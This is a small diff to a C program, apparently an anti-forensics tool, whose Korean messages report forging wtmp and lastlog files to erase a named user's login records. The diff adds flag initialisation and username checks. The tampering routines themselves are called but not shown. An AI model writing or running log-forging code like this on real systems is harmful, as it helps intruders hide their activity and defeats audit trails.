@@ -10,6 +10,11 @@ void usage(){
 int main(int argc,char *argv[])
 {   
     int c;
+    aFlag=0;
+    RFlag=0;
+    AFlag=0;
+    lasttime1 = 0;
+    lasttime2 = 0;
 
     while((c=getopt(argc,argv,"A:a:t:d:R:"))!=EOF){
         switch (c)
@@ -62,12 +67,22 @@ int main(int argc,char *argv[])
     }else{
         printf("wtmp파일 위조 완료\n");
     }
+    if(RFlag){
+        if(getpwnam(username1)==NULL){
+            printf("%s: 존재하지 않은 유저 이름입니다!\n",username1);
+            return 0;
+        }
+        if(getpwnam(username2)==NULL){
+            printf("%s: 존재하지 않은 유저 이름입니다!\n",username2);
+            return 0;
+        }
+    }
+    
     if(kill_lastlog("/var/log/lastlog")==-1){
         return 0;
     }else{
         printf("lastlog파일 위조 성공\n");
     }
-    printf("%s의 로그지우기 성공\n",username1);
-    
+
     return 0;
 }
